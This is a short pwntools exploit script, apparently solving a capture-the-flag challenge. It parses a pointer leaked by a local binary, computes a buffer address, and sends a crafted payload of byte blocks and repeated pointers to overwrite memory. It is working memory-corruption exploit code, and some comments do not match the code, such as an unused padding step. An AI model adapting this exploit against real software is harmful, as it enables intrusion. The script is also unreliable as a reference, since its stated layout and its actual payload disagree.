from pwn import *
from itertools import permutations
import re, struct

# Adjust path if needed
p = process("./main")

# 1) Read the leak line: "ptrs[0] = 0x..."
line = p.recvline().decode()
m = re.search(r'ptrs\[0\]\s*=\s*(0x[0-9a-fA-F]+)', line)
if not m:
    log.failure(f"Couldn't parse leak from: {line!r}")
    exit(1)
a_addr = int(m.group(1), 16)
log.success(f"leaked a = {hex(a_addr)}")

# 2) Compute vuln from observed fixed offset (from your GDB: a - vuln = 0xe0)
OFF_A_MINUS_VULN = 0xe0
vuln = a_addr - OFF_A_MINUS_VULN
log.info(f"computed vuln = {hex(vuln)}")

# 3) Build the 24 permutation blocks (bytes 0..95 go into vuln)
perms = list(permutations([0,1,2,3]))
blocks = b''.join(bytes(p4) for p4 in perms)   # 24 * 4 = 96 bytes

# 4) Padding from end of blocks up to start of the 0xe0 region
pad = b'A' * (OFF_A_MINUS_VULN - len(blocks))  # 224 - 96 = 128 bytes

# 5) Overwrite region between vuln and a (0xe0 bytes) with a CYCLIC sequence of pointers
#    We only need the part that falls where 'ptrs' actually lives.
ptr_list = [vuln + 4*i for i in range(24)]          # desired 24 targets
# Fill the whole 0xe0 region with a repetition, so *any* 24-entry window is a rotation
ptr_region = b''.join(p64(ptr_list[i % 24]) for i in range(28))  # 28 * 8 = 224 bytes

# 6) The program does read(…, 0xe4) -> 228 bytes. We only need to provide >= 0xe4.
#    We'll send exactly 0xe4 so it lands perfectly.
payload = blocks + ptr_region
payload = payload[:0xe4]  # ensure exactly 228 bytes

assert len(payload) == 0xe4

# 7) Send payload
p.send(payload)

# 8) Show output
print(p.recvall(timeout=1).decode(errors="ignore"))
